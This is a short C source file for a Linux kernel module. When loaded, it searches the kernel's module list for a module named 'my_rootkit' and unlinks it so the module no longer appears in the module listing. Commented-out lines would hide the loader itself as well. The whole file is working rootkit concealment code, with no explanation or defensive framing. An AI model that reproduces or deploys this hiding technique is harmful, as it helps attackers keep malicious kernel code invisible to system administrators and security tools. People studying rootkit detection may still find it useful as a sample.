#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/string.h>
#include <linux/moduleparam.h>

#define DEBUG_REMOVE_MOD(ret, name) \
	do {\
		if (0 == (ret)) { \
			printk(KERN_DEBUG "Remove module %s successfully.\n", (name)); \
		}\
		else if (-1 == (ret)){\
			printk(KERN_DEBUG "Cannot find module %s.\n", (name));\
		}\
		else {\
			printk(KERN_DEBUG "Error\n");\
		}\
	}while(0)

static char *g_mod_name = "my_rootkit";
//module_param(g_mod_name, charp, 0);

static int remove_mod(char *mod_name)
{
	struct module *mod_head, *mod_counter;
	struct list_head *p = NULL;

	mod_head = &__this_module;
	list_for_each(p, &(*(mod_head->list).prev)) {
		mod_counter = list_entry(p, struct module, list);
		if (0 == strcmp(mod_counter->name, mod_name)) {
			list_del(p);
			return 0;
		}
	}
	return -1;
}
static int __init remove_module_init(void)
{
	int nRet = -1;

	//remove module my_rootkit
	nRet = remove_mod(g_mod_name);
	DEBUG_REMOVE_MOD(nRet, g_mod_name);
	//remove current module
	//nRet = remove_mod(__this_module.name);
	//DEBUG_REMOVE_MOD(nRet, __this_module.name);
	return 0;
}
static void __exit remove_module_exit(void)
{
}

MODULE_AUTHOR("ChHuWaLi");
MODULE_LICENSE("Dual BSD/GPL");
module_init(remove_module_init);
module_exit(remove_module_exit);
